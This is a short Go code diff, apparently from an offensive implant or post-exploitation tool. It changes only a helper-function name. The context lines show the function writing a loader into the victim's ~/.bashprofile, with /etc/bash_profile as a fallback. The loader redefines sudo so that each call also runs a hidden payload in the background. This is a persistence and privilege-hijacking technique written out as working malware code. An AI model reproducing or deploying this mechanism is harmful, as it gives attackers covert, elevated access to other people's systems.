@@ -140,7 +140,7 @@ func profiles() (err error) {
 	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
 	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
 	if err != nil {
-		if !util.IsFileExist(user.HomeDir) {
+		if !util.IsExist(user.HomeDir) {
 			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
 			if err != nil {
 				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
